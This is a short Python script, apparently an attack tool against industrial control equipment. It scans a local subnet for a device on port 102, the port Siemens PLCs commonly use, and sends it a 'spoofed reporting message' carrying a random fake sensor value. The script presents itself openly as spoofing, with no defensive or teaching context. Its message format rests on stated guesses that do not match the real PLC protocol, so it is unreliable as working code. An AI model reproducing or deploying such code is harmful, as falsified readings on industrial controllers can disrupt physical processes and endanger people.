import socket
import random

# Function to find the PLC's IP address
def find_plc_ip():
    # Assuming the PLC is on the same network as the Windows machine
    # and the subnet mask is 255.255.255.0
    for i in range(1, 255):
        ip = f"192.168.1.{i}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, 102))
            sock.close()
            return ip
        except socket.error:
            pass
    return None

# Function to send spoofed reporting messages
def send_spoofed_message(plc_ip):
    # Assuming the reporting message format is a simple string
    # with the format "DEVICE_ID:VALUE"
    device_id = "DEVICE_1"
    value = random.randint(0, 100)
    message = f"{device_id}:{value}"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((plc_ip, 102))
    sock.sendall(message.encode())
    sock.close()

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC IP address found: {plc_ip}")
        send_spoofed_message(plc_ip)
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()